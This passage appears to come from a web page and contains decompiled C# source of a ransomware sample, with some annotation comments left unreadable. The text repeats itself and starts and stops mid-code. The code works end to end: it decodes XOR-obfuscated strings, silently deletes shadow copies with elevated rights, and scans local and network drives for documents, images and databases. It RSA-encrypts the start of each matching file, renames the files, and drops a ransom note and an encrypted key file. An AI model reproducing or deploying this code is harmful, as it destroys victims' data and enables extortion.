0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> + fFYiO9CH9iZwwzlsQ3X + qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W + <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, 